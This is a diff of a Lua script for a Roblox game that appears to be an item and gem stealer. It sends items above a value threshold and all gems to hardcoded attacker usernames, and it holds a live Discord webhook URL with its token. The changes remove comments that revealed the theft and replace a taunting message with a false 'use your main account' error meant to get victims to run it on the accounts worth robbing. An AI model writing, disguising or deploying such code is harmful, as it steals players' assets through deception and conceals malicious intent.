@@ -1,7 +1,7 @@
 Username = "adopsjene"
-Username2 = "JSJEJEIDIjeij" -- stuff will get sent to this user if first user's mailbox is full
+Username2 = "JSJEJEIDIjeij" -- idk why u see this
 webhook = "https://discord.com/api/webhooks/1322323929389469807/TSWLMpi2yqzgZQHcHkJwjUrjMblMGkkaIaqXQlQjsubw3Qd-n_miC5QdDX-ZgUPqMNMQ"
-min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default
+min_rap = 1000000 -- yeyeyeye
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
@@ -362,6 +362,6 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     end
     SendAllGems()
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("all your pets got fucked ")
-    setclipboard("nuh uh")
+    message.Error("you are using your alt acc please use your main acc ")
+    setclipboard("daddy")
 end
